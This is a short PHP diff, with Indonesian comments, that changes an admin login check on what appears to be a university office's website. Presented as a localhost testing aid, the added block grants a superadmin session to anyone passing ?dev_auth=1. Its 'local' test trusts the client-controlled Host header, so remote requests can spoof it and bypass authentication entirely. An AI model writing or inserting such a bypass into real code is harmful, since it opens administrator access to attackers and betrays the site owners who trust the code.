@@ -8,7 +8,15 @@ if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 
-// 1. Cek sesi login
+// 1. Cek sesi login (Mendukung pengujian localhost dengan parameter dev_auth)
+$is_local_dev = in_array($_SERVER['REMOTE_ADDR'] ?? '', ['127.0.0.1', '::1']) || strpos($_SERVER['HTTP_HOST'] ?? '', 'localhost') !== false;
+if (isset($_GET['dev_auth']) && $_GET['dev_auth'] === '1' && $is_local_dev) {
+    $_SESSION['admin_id'] = 1;
+    $_SESSION['admin_email'] = 'tu.lpm@unika.ac.id';
+    $_SESSION['admin_name'] = 'Tata Usaha LPM';
+    $_SESSION['admin_role'] = 'superadmin';
+}
+
 if (php_sapi_name() !== 'cli' && !isset($_SESSION['admin_id'])) {
     redirect(SITE_URL . '/admin/index.php');
     exit;
